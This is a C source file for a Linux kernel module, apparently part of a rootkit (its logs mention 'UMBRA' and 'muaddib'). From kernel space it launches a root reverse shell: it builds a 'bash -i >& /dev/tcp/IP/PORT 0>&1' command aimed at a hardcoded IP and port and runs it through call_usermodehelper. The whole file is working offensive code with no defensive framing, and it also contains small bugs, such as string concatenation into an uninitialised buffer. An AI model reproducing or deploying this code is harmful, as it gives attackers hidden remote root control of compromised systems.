#include <linux/workqueue.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/kmod.h>

#define REVERSE_SHELL_IP "192.168.172.1"
#define REVERSE_SHELL_PORT "42069"

#define PATH "PATH=/sbin:/bin:/usr/sbin:/usr/bin"
#define HOME "HOME=/root"
#define TERM "TERM=xterm-256color"
#define SHELL "/bin/bash"
#define EXEC_P1 "bash -i >& /dev/tcp/"
#define EXEC_P2 "0>&1"

struct shell_params {
	struct work_struct work;
	char* target_ip;
	char* target_port;
};

void execute_reverse_shell(struct work_struct *work){
    int err;
    struct shell_params *params = (struct shell_params*)work;
    char *envp[] = {HOME, TERM, params->target_ip, params->target_port, NULL};
    char *exec = kmalloc(sizeof(char)*256, GFP_KERNEL);
    char *argv[] = {SHELL, "-c", exec, NULL};
    strcat(exec, EXEC_P1);
    strcat(exec, params->target_ip);
	strcat(exec, "/");
    strcat(exec, params->target_port);
	strcat(exec, " ");
    strcat(exec, EXEC_P2);
    printk(KERN_INFO "muaddib: Starting reverse shell %s\n", exec);

    err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if(err<0){
        printk(KERN_INFO "UMBRA:: Error executing usermodehelper.\n");
    }
    kfree(exec);
    kfree(params->target_ip);
    kfree(params->target_port);
    kfree(params);

}

int start_reverse_shell(char* ip, char* port){
    int err;
    struct shell_params *params = kmalloc(sizeof(struct shell_params), GFP_KERNEL);
    if(!params){
        printk(KERN_INFO "UMBRA:: Error allocating memory\n");
        return 1;
    }
    params->target_ip = kstrdup(ip, GFP_KERNEL);
    params->target_port = kstrdup(port, GFP_KERNEL);
    INIT_WORK(&params->work, &execute_reverse_shell);

    err = schedule_work(&params->work);
    if(err<0){
        printk(KERN_INFO "UMBRA:: Error scheduling work of starting shell\n");
    }
    return err;

}
